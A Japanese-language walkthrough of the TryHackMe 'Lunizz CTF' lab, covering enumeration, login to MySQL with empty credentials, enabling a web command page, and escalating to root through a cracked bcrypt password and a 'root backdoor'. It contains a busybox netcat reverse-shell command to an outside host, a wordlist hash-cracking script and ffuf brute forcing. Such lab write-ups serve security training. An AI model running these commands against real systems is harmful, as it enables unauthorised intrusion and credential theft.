# Lunizz CTF

https://tryhackme.com/room/lunizzctfnd

## Enumeration

```shell
TARGET=10.65.133.139
sudo bash -c "echo $TARGET   lunizz.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
3306/tcp  open  mysql   syn-ack ttl 64
4444/tcp  open  krb524  syn-ack ttl 64
5000/tcp  open  upnp    syn-ack ttl 64
33060/tcp open  mysqlx  syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80,3306,4444,5000,33060 $TARGET

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.41 ((Ubuntu))
3306/tcp  open  nagios-nsca Nagios NSCA
4444/tcp  open  krb524?
5000/tcp  open  upnp?
33060/tcp open  mysqlx?
```

SSH, HTTP, MySQL その他は不明。

mySQL ユーザー列挙

```sh
nmap -sS -n -p3306 --script "mysql-enum" $TARGET

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
```

### ディレクトリ列挙

```sh
dirb http://lunizz.thm

---- Scanning URL: http://lunizz.thm/ ----
==> DIRECTORY: http://lunizz.thm/hidden/                                                                             
+ http://lunizz.thm/index.html (CODE:200|SIZE:10918)                                                                 
+ http://lunizz.thm/server-status (CODE:403|SIZE:275)                                                                
==> DIRECTORY: http://lunizz.thm/whatever/                                                                           
                                                                                                                     
---- Entering directory: http://lunizz.thm/hidden/ ----
+ http://lunizz.thm/hidden/index.php (CODE:200|SIZE:396)                                                             
==> DIRECTORY: http://lunizz.thm/hidden/uploads/                                                                     
                                                                                                                     
---- Entering directory: http://lunizz.thm/whatever/ ----
+ http://lunizz.thm/whatever/index.php (CODE:200|SIZE:247)                                                           
                                                                                                                     
---- Entering directory: http://lunizz.thm/hidden/uploads/ ----
(!) WARNING: All responses for this directory seem to be CODE = 403.                                                 
    (Use mode '-w' if you want to scan it anyway)
```

#### /hidden

/hidden はファイルアップロード画面。

```txt
Sorry, file already exists.
Sorry, only JPG, JPEG, PNG & GIF files are allowed.
Sorry, your file was not uploaded.
```

普通のJPEG画像をアップロードしたら、下記表示。保存されたと表示されているが、アップロード後のファイル名が分からないし、/uploads の中は全てForbiddenで返っているようなので、アップロードする意味があるのかは疑わしい。

```txt
File is an image - image/jpeg.
The file has been uploaded to uploads/
```

#### /whatever

/whatever はコマンド実行画面。`id` など入力しても、そのまま id と表示されるだけ。

```
Command Executer Mode :0
```

#### ファイル検索

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 64 -k

root@ip-10-65-103-234:~# gobuster dir -q -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 64 -k
/hidden               (Status: 301) [Size: 315] [--> http://10.65.133.139/hidden/]
/instructions.txt     (Status: 200) [Size: 339]
/whatever             (Status: 301) [Size: 317]
```

/instructions.txt

```
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:[REDACTED])
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE
```

mysql

```sh
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| runornot           |
+--------------------+
3 rows in set (0.191 sec)

MySQL [(none)]> use runornot;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [runornot]> show tables;
+--------------------+
| Tables_in_runornot |
+--------------------+
| runcheck           |
+--------------------+
1 row in set (0.187 sec)

MySQL [runornot]> select * from runcheck;
+------+
| run  |
+------+
|    0 |
+------+
```

update した。（原因不明だが1回目は権限エラーになった）

```sh
MySQL [runornot]> update runcheck set run=1;
Query OK, 1 row affected (0.604 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [runornot]> select * from runcheck;
+------+
| run  |
+------+
|    1 |
+------+
1 row in set (0.183 sec)'
```

/whatever で id コマンドが実行できるようになった。

```txt
Command Executer Mode :1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

リバースシェルを実行。

```sh
busybox nc 192.168.129.60 8888 -e /bin/sh
```

成功。

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.129.60] from (UNKNOWN) [10.65.133.139] 49858
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格

adam と mason が存在するが、どちらもホームディレクトリは参照不可。

```sh
www-data@ip-10-65-133-139:/$ ls -al /home
total 24
drwxr-xr-x  6 root     root     4096 Nov 20 04:42 .
drwxr-xr-x 25 root     root     4096 Nov 20 05:16 ..
drwxr-x---  4 adam     adam     4096 Feb 28  2021 adam
drwxr-x---  2 mason    mason    4096 Feb 28  2021 mason
drwxr-xr-x  2 ssm-user ssm-user 4096 Jun  7 15:58 ssm-user
drwxr-xr-x  3 ubuntu   ubuntu   4096 Nov 20 04:42 ubuntu
```

ルートディレクトリに proct という adam オーナーのディレクトリがある。

```sh
www-data@ip-10-65-133-139:/$ ls -al /proct
total 12
drwxr-xr-x  3 adam adam 4096 Feb 28  2021 .
drwxr-xr-x 25 root root 4096 Nov 20 05:16 ..
drwxr-xr-x  2 adam adam 4096 Feb 28  2021 pass
www-data@ip-10-65-133-139:/$ ls -al /proct/pass
total 12
drwxr-xr-x 2 adam adam 4096 Feb 28  2021 .
drwxr-xr-x 3 adam adam 4096 Feb 28  2021 ..
-rw-r--r-- 1 adam adam  273 Feb 28  2021 bcrypt_encryption.py
```

```python
www-data@ip-10-65-133-139:/$ cat /proct/pass/bcrypt_encryption.py 
import bcrypt
import base64

passw = "wewillROCKYOU".encode('ascii')
b64str = base64.b64encode(passw)
hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
print(hashAndSalt)

#hashAndSalt = b'[REDACTED]'
#bcrypt.checkpw()
```

bcryptのハッシュが出ているが、パスワードのBase64文字列に対して実行しているので、直接 rockyou.txt を使うことはできない。

下記スクリプトで adamのパスワードが判明した。

```python
import bcrypt
import base64

filename = "/usr/share/wordlists/rockyou.txt"
target_hash = b'[REDACTED]'

with open(filename, "r", encoding="utf-8") as f:
    for line in f:
        text = line.rstrip("\n")
        enc = text.encode('ascii')
        b64str = base64.b64encode(enc)

        if bcrypt.checkpw(b64str, target_hash):
            print(text)
            break
```

## 権限昇格２

```sh
$ ls -al
total 5876
drwxr-x--- 5 adam  adam     4096 Nov 20 05:56 .
drwxr-xr-x 6 root  root     4096 Nov 20 04:42 ..
-rw-r--r-- 1 adam  adam      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 adam  adam     3771 Apr  4  2018 .bashrc
drwx------ 2 adam  adam     4096 Nov 20 05:56 .cache
drwxr-xr-x 3 adam  adam     4096 Feb 28  2021 Desktop
drwxr-xr-x 2 adam  adam     4096 Feb 28  2021 Downloads
-rw-r--r-- 1 adam  adam      807 Apr  4  2018 .profile
-rwxrwxr-x 1 mason mason 5692824 Mar  1  2021 runasmason
-rw-r--r-- 1 mason mason     166 Mar  1  2021 .runasmason.conf
-rw-rw-r-- 1 mason mason  280000 Mar  1  2021 runasmason.dat
---------- 1 root  root      862 Mar  1  2021 runasmason_source_code.bak
```

ホームディレクトリ以下のファイル

```sh
$ find .
.
./.runasmason.conf
./runasmason
./Desktop
./Desktop/.archive
./Desktop/.archive/to_my_best_friend_adam.txt
./Downloads
./.cache
./.cache/motd.legal-displayed
./base64.txt
./runasmason.dat
./.bashrc
./.bash_logout
./runasmason_source_code.bak
./.profile
```

runasmasonという実行ファイル。実行したらmasonとしてコマンド実行するようなことを書いているが、SUIDもついておらず、capabilityも無いので昇格の役には立たないと判断。

```sh
$ file ./runasmason
./runasmason: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3507aa01d32c34dc8e8c6462b764adb90a82768d, stripped
```

```sh
$ cat .runasmason.conf
[CONFIG]
runasmason                        = True
backup_password                   = "helpme" # use -b for backup password
can_runasmason_run_other_commands = False
```

runasmason.dat を base64 デコードしたら、ワードリストのようなファイルになった。

```sh
$ cat ./runasmason.dat | base64 -d > out.txt            

$ head ./out.txt
0yrewItN73SY3OImWfEx
mJT0eQJa199wjIyZJJdS
WKwOdwGf8cveIP0I7GcC
d3DeVMC6Vv5mbf5cNfl6
FHaoCTh631Crs8FQ9NM7
wn3xEOvzaNu3FV1UtXEi
JuCizJjTQ7xxw0nh6YYk
X5Wm9jqyFbOYVm1EFA3x
hsYXYuj3uB5jFLzQqXCn
g63gxEzU5e4UmmNEs4eo
```

テキストファイル。

```sh
$ cat ./Desktop/.archive/to_my_best_friend_adam.txt
do you remember our place 
i love there it's soo calming
i will make that lights my password

--

https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000
```

Mapに飛ぶと、フィンランドの `Polaris Point Horses` の近くを指している。が、設問の答えが分からない。  
→ オーロラを英語で `northern lights` という。

su で mason に昇格。

## 権限昇格２

masonグループのファイルを検索したら、気になるクラッシュファイルがあった。

```sh
$ find / -group mason -type f -not -path "/proc/*" 2>/dev/null
/var/crash/_var_backups_.script_runasroot.py.1001.crash
/home/mason/user.txt
/home/mason/.bashrc
/home/mason/.bash_logout
/home/mason/.profile
```

その中にこの行があった。

```txt
PythonArgs: ['/var/backups/.script/runasroot.py']
```

```sh
$ ls -al /var/backups/.script
total 24
drwxr-xr-x 2 root root 4096 Feb 28  2021 .
drwxr-xr-x 3 root root 4096 Nov 20 06:43 ..
-rw-r--rw- 1 root root 1450 Nov 20 04:48 fakessh.log
-rw-r--rw- 1 root root 1027 Nov 20 04:48 runasroot.log
-rw-r--r-x 1 root root 1175 Feb 28  2021 runasroot.py
-rw-r--r-x 1 root root  414 Feb 28  2021 ssh.py
```

nmapで4444ポートが開いていたことを思い出した。pickleのデコーダはRCEの可能性があるが、これはウサギの穴だと思われる。

```python
$ cat /var/backups/.script/runasroot.py
import socket
import base64
import random

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4444))
s.listen(5)

passarray = ["extremehardrootpassword", "extremesecurerootpassword", "p@ssword", "letmein", "randompassword"]

while True:
        c, addr = s.accept()
        with open("/var/backups/.script/runasroot.log", "a") as f:
                f.write("Connection Accepted From {}\n".format(addr))
        choice = random.choice(passarray)
        passwd = base64.b64encode(choice.encode())
        c.sendall(b"Can you decode this for me?\n")
        c.sendall(passwd + b"\n")
        with open("/var/backups/.script/runasroot.log", "a") as f:
                f.write("Password Sent, Password :{}\n".format(choice))
        getpasswd = c.recv(4096)
        with open("/var/backups/.script/runasroot.log", "a") as f:
                f.write("Client Sent Password :{}\n".format(getpasswd.decode()))
        if choice == getpasswd.decode().strip():
                c.sendall(b"root@lunizz:# ")
                c.recv(4096)
                c.sendall(b"FATAL ERROR")
        else:
                c.sendall(b"Wrong Password")
                c.close()
```

ssh.py は5000ポートで、これもウサギの穴。

```python
$ cat /var/backups/.script/ssh.py
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 5000))
s.listen(5)

while True:
        c, addr = s.accept()
        with open("/var/backups/.script/fakessh.log", "a") as f:
                f.write("Bamboozled Client :{}\n".format(addr))
        c.sendall(b"OpenSSH 5.1\n")
        c.sendall(b"Unable to load config info from /usr/local/ssl/openssl.cnf")
        c.close()
```

ローカル8080ポートをリッスンしている。

```sh
$ ss -tnlp
State    Recv-Q    Send-Q       Local Address:Port        Peer Address:Port   Process                              
LISTEN   0         4096             127.0.0.1:8080             0.0.0.0:*                                           
LISTEN   0         5                  0.0.0.0:5000             0.0.0.0:*       users:(("python3",pid=719,fd=3))    
LISTEN   0         151                0.0.0.0:3306             0.0.0.0:*                                           
LISTEN   0         128                0.0.0.0:22               0.0.0.0:*                                           
LISTEN   0         4096         127.0.0.53%lo:53               0.0.0.0:*                                           
LISTEN   0         5                  0.0.0.0:4444             0.0.0.0:*       users:(("python3",pid=1350,fd=3))   
LISTEN   0         128                   [::]:22                  [::]:*                                           
LISTEN   0         511                      *:80                     *:*                                           
LISTEN   0         70                       *:33060                  *:*
```

Root Backdoor と書かれている。（疑わしいが）

```sh
$ curl -v http://localhost:8080/
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Host: localhost:8080
< Date: Thu, 20 Nov 2025 07:07:49 GMT
< Connection: close
< X-Powered-By: PHP/7.4.3-4ubuntu2.29
< Content-type: text/html; charset=UTF-8
< 
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```

下記のように送ってみたが無反応。

```sh
curl -v 'http://localhost:8080/?password=northernlights&cmdtype=lsla'
```

SSHトンネリング

```sh
ssh -L 8080:localhost:8080 adam@10.65.133.139 -N
```

前にBase64デコードで出てきたワードリストを使ってブルートフォースをかけたが、反応なし。

```sh
ffuf -u 'http://localhost:8080/?password=FUZZ&cmdtype=lsla' -c -w ./out.txt -fs 410
```

dirb。誰かのホームディレクトリと思われる。

```sh
---- Scanning URL: http://localhost:8080/ ----
+ http://localhost:8080/.bash_history (CODE:200|SIZE:0)                        
+ http://localhost:8080/.bashrc (CODE:200|SIZE:3771)                           
+ http://localhost:8080/.mysql_history (CODE:200|SIZE:0)                       
+ http://localhost:8080/.profile (CODE:200|SIZE:161)                           
-----------------
```

POST で返ってきた。/root ディレクトリと思われる。

```sh
$ curl -X POST 'http://localhost:8080/' -d 'password=[REDACTED]&cmdtype=lsla' 
total 48
drwx------  7 root root 4096 Jun  7 16:07 .
drwxr-xr-x 25 root root 4096 Nov 20 05:16 ..
lrwxrwxrwx  1 root root    9 Feb 10  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3771 Feb 10  2021 .bashrc
drwx------  3 root root 4096 Feb 12  2021 .cache
drwx------  3 root root 4096 Feb 12  2021 .gnupg
-rw-r--r--  1 root root 1044 Feb 28  2021 index.php
drwxr-xr-x  3 root root 4096 Feb  9  2021 .local
lrwxrwxrwx  1 root root    9 Feb 11  2021 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-r-----  1 root root   38 Feb 28  2021 r00t.txt
-rw-r--r--  1 root root   66 Feb 28  2021 .selected_editor
drwx------  3 root root 4096 Apr 26  2025 snap
drwx------  2 root root 4096 Feb  9  2021 .ssh
-rw-------  1 root root    0 Jun  7 16:07 .viminfo
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```

passwd コマンドを送ったら、root ユーザーのパスワードをリセットしてくれた。

```sh
$ curl -X POST 'http://localhost:8080/' -d 'password=[REDACTED]&cmdtype=passwd'
<br>Password Changed To :[REDACTED]<br>**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```

昇格成功。

```sh
$ su root
Password: 
root@ip-10-65-133-139:/home# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 特筆する技術要素は無し。一番難しかったのは、mason のパスワード。
- オーロラを英語で `northern lights` という
- ウサギの穴が多かったが、わりと論理的に「これは役に立たない」と判断できたと思う

## Tags

#tags:ウサギの穴
